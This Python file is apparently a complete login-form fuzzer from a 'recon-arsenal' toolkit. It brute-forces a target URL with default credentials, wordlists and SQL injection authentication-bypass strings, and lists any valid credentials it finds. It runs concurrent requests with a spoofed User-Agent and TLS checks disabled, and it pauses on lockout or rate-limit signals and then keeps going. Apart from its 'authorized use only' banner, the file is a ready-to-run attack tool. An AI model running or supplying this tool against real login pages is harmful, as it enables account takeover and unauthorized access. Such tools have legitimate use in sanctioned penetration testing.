#!/usr/bin/env python3
"""
recon-arsenal :: login_fuzzer.py
Login form fuzzer — authorized testing only.
Tests: credential stuffing, default creds, bypass payloads, rate-limit detection.
"""

import argparse
import asyncio
import json
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
from urllib.parse import urlencode

import aiohttp
from colorama import Fore, Style, init
from rich.console import Console
from rich.table import Table

init(autoreset=True)
console = Console()

BANNER = f"""{Fore.MAGENTA}
+--------------------------------------------------+
¦       recon-arsenal :: login-fuzzer v1.0         ¦
¦   Credential Testing — Authorized Use Only       ¦
+--------------------------------------------------+
{Style.RESET_ALL}"""

# -- Default credentials (common device/service defaults) --
DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
    ("admin", "admin123"), ("admin", ""), ("root", "root"),
    ("root", "toor"), ("root", "password"), ("root", ""),
    ("administrator", "administrator"), ("administrator", "password"),
    ("user", "user"), ("user", "password"), ("guest", "guest"),
    ("guest", ""), ("test", "test"), ("test", "password"),
    ("demo", "demo"), ("pi", "raspberry"), ("ubnt", "ubnt"),
    ("cisco", "cisco"), ("enable", "enable"),
]

# -- SQL Injection bypass payloads --
SQLI_BYPASS = [
    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "admin'--", "admin'#", "' OR 'x'='x", "') OR ('1'='1",
    "') OR ('x'='x", "' OR 1=1 LIMIT 1--", "1' OR '1'='1",
    "\" OR \"\"=\"", "' OR ''='", "or 1=1", "or 1=1--",
]

# -- Common weak passwords --
WEAK_PASSWORDS = [
    "password", "123456", "12345678", "qwerty", "abc123",
    "monkey", "1234567", "letmein", "trustno1", "dragon",
    "master", "sunshine", "princess", "welcome", "shadow",
    "superman", "michael", "football", "password1", "iloveyou",
]


@dataclass
class LoginConfig:
    url: str
    user_field: str = "username"
    pass_field: str = "password"
    users: list = field(default_factory=list)
    passwords: list = field(default_factory=list)
    user_file: Optional[str] = None
    pass_file: Optional[str] = None
    success_string: Optional[str] = None
    failure_string: Optional[str] = None
    success_code: int = 302
    threads: int = 10
    delay: float = 0.5
    timeout: int = 15
    proxy: Optional[str] = None
    headers: dict = field(default_factory=dict)
    cookies: dict = field(default_factory=dict)
    extra_fields: dict = field(default_factory=dict)
    mode: str = "credential"      # credential | sqli | default | all
    stop_on_success: bool = True
    output: Optional[str] = None
    verbose: bool = False
    detect_lockout: bool = True


@dataclass
class AttemptResult:
    username: str
    password: str
    status: int
    success: bool
    elapsed: float
    redirect: Optional[str] = None
    body_snippet: str = ""


class LoginFuzzer:
    def __init__(self, cfg: LoginConfig):
        self.cfg = cfg
        self.hits: list[AttemptResult] = []
        self.attempts: int = 0
        self.lockout_detected: bool = False
        self._stop = False
        self._semaphore: asyncio.Semaphore = None
        self._session: aiohttp.ClientSession = None

    def _load_list(self, path: str) -> list[str]:
        p = Path(path)
        if not p.exists():
            console.print(f"[red]File not found: {p}[/red]")
            return []
        return [l.strip() for l in p.read_text(errors="ignore").splitlines()
                if l.strip() and not l.startswith("#")]

    def _build_pairs(self) -> list[tuple[str, str]]:
        mode = self.cfg.mode
        pairs = []

        if mode in ("default", "all"):
            pairs.extend(DEFAULT_CREDS)

        if mode in ("sqli", "all"):
            users = self.cfg.users or ["admin", "root", "administrator"]
            for u in users:
                for bypass in SQLI_BYPASS:
                    pairs.append((u, bypass))
                    pairs.append((bypass, bypass))

        if mode in ("credential", "all"):
            users = self.cfg.users[:]
            if self.cfg.user_file:
                users.extend(self._load_list(self.cfg.user_file))
            passwords = self.cfg.passwords[:]
            if self.cfg.pass_file:
                passwords.extend(self._load_list(self.cfg.pass_file))
            if not passwords:
                passwords = WEAK_PASSWORDS
            for u in users:
                for p in passwords:
                    pairs.append((u, p))

        # Deduplicate while preserving order
        seen = set()
        result = []
        for p in pairs:
            if p not in seen:
                seen.add(p)
                result.append(p)
        return result

    def _is_success(self, status: int, body: str, redirect: Optional[str]) -> bool:
        cfg = self.cfg
        if cfg.success_string and cfg.success_string.lower() in body.lower():
            return True
        if cfg.failure_string and cfg.failure_string.lower() in body.lower():
            return False
        # Heuristic: redirect after POST usually = success
        if status in (200, 302, 301) and redirect and redirect != cfg.url:
            return True
        if status == cfg.success_code:
            return True
        return False

    def _detect_lockout(self, body: str, status: int) -> bool:
        indicators = ["locked", "too many", "temporarily", "blocked",
                      "account suspended", "captcha", "429"]
        if status == 429:
            return True
        return any(ind in body.lower() for ind in indicators)

    async def _try_login(self, username: str, password: str) -> AttemptResult:
        cfg = self.cfg
        data = {
            cfg.user_field: username,
            cfg.pass_field: password,
            **cfg.extra_fields,
        }
        headers = {"Content-Type": "application/x-www-form-urlencoded",
                   "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"}
        headers.update(cfg.headers)

        start = time.monotonic()
        try:
            async with self._semaphore:
                if cfg.delay > 0:
                    await asyncio.sleep(cfg.delay)
                async with self._session.post(
                    cfg.url,
                    data=data,
                    headers=headers,
                    cookies=cfg.cookies,
                    allow_redirects=False,
                    ssl=False,
                    timeout=aiohttp.ClientTimeout(total=cfg.timeout),
                ) as resp:
                    elapsed = round(time.monotonic() - start, 3)
                    body = await resp.text(errors="ignore")
                    redirect = resp.headers.get("Location")
                    success = self._is_success(resp.status, body, redirect)
                    self.attempts += 1

                    if cfg.detect_lockout and self._detect_lockout(body, resp.status):
                        self.lockout_detected = True
                        console.print("[bold red]? Lockout / rate-limit detected! Slowing down.[/bold red]")
                        await asyncio.sleep(10)

                    return AttemptResult(
                        username=username,
                        password=password,
                        status=resp.status,
                        success=success,
                        elapsed=elapsed,
                        redirect=redirect,
                        body_snippet=body[:200],
                    )
        except Exception as e:
            self.attempts += 1
            if cfg.verbose:
                console.print(f"[dim red]ERR {username}:{password} — {e}[/dim red]")
            return AttemptResult(username=username, password=password,
                                 status=0, success=False, elapsed=0.0)

    def _print_attempt(self, r: AttemptResult):
        if r.success:
            console.print(
                f"[bold green]? HIT[/bold green] "
                f"[bold]{r.username}[/bold]:[bold]{r.password}[/bold] "
                f"? {r.status} ({r.elapsed}s)"
                + (f" ? {r.redirect}" if r.redirect else "")
            )
        elif self.cfg.verbose:
            console.print(f"[dim]? {r.username}:{r.password} ? {r.status}[/dim]")

    def _save(self):
        if not self.cfg.output or not self.hits:
            return
        data = [r.__dict__ for r in self.hits]
        Path(self.cfg.output).write_text(json.dumps(data, indent=2))
        console.print(f"\n[green]Saved {len(self.hits)} hit(s) ? {self.cfg.output}[/green]")

    async def run(self):
        pairs = self._build_pairs()
        console.print(f"[bold]Target:[/bold] {self.cfg.url}")
        console.print(f"[bold]Mode:[/bold] {self.cfg.mode} | "
                      f"[bold]Pairs:[/bold] {len(pairs)} | "
                      f"[bold]Threads:[/bold] {self.cfg.threads}")

        connector = aiohttp.TCPConnector(limit=self.cfg.threads, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            self._session = session
            self._semaphore = asyncio.Semaphore(self.cfg.threads)

            async def worker(u, p):
                if self._stop:
                    return
                r = await self._try_login(u, p)
                self._print_attempt(r)
                if r.success:
                    self.hits.append(r)
                    if self.cfg.stop_on_success:
                        self._stop = True

            tasks = [worker(u, p) for u, p in pairs]
            await asyncio.gather(*tasks)

        console.print(f"\n[bold]Done.[/bold] Attempts: {self.attempts} | Hits: {len(self.hits)}")
        if self.hits:
            t = Table(title="Valid Credentials Found", style="green")
            t.add_column("Username"); t.add_column("Password"); t.add_column("Status")
            for h in self.hits:
                t.add_row(h.username, h.password, str(h.status))
            console.print(t)
        self._save()


def parse_args():
    p = argparse.ArgumentParser(
        description="Login form fuzzer — authorized testing only",
        formatter_class=argparse.RawTextHelpFormatter
    )
    p.add_argument("-u", "--url", required=True, help="Login endpoint URL")
    p.add_argument("--user-field", default="username", help="Username form field name")
    p.add_argument("--pass-field", default="password", help="Password form field name")
    p.add_argument("-U", "--user", action="append", default=[], metavar="USERNAME")
    p.add_argument("-P", "--password", action="append", default=[], metavar="PASSWORD")
    p.add_argument("-uf", "--user-file", help="Username wordlist file")
    p.add_argument("-pf", "--pass-file", help="Password wordlist file")
    p.add_argument("-m", "--mode", default="credential",
                   choices=["credential","sqli","default","all"],
                   help="Fuzzing mode (default: credential)")
    p.add_argument("--success-string", help="String in body that indicates success")
    p.add_argument("--failure-string", help="String in body that indicates failure")
    p.add_argument("--success-code", type=int, default=302)
    p.add_argument("-t", "--threads", type=int, default=10)
    p.add_argument("-d", "--delay", type=float, default=0.5)
    p.add_argument("--timeout", type=int, default=15)
    p.add_argument("-p", "--proxy", help="HTTP proxy e.g. http://127.0.0.1:8080")
    p.add_argument("-H", "--header", action="append", default=[], metavar="Name:Value")
    p.add_argument("-b", "--cookie", action="append", default=[], metavar="name=value")
    p.add_argument("-F", "--field", action="append", default=[], metavar="name=value",
                   help="Extra POST fields (e.g. _token=abc123)")
    p.add_argument("--no-stop", action="store_true", help="Continue after first hit")
    p.add_argument("--no-lockout-detect", action="store_true")
    p.add_argument("-o", "--output", help="Save hits to JSON file")
    p.add_argument("-v", "--verbose", action="store_true")
    return p.parse_args()


def main():
    print(BANNER)
    args = parse_args()

    headers = {k.split(":")[0].strip(): ":".join(k.split(":")[1:]).strip()
               for k in args.header if ":" in k}
    cookies = {k.split("=")[0]: k.split("=",1)[1] for k in args.cookie if "=" in k}
    extra   = {k.split("=")[0]: k.split("=",1)[1] for k in args.field  if "=" in k}

    cfg = LoginConfig(
        url=args.url,
        user_field=args.user_field,
        pass_field=args.pass_field,
        users=args.user,
        passwords=args.password,
        user_file=args.user_file,
        pass_file=args.pass_file,
        success_string=args.success_string,
        failure_string=args.failure_string,
        success_code=args.success_code,
        threads=args.threads,
        delay=args.delay,
        timeout=args.timeout,
        proxy=args.proxy,
        headers=headers,
        cookies=cookies,
        extra_fields=extra,
        mode=args.mode,
        stop_on_success=not args.no_stop,
        output=args.output,
        verbose=args.verbose,
        detect_lockout=not args.no_lockout_detect,
    )

    asyncio.run(LoginFuzzer(cfg).run())


if __name__ == "__main__":
    main()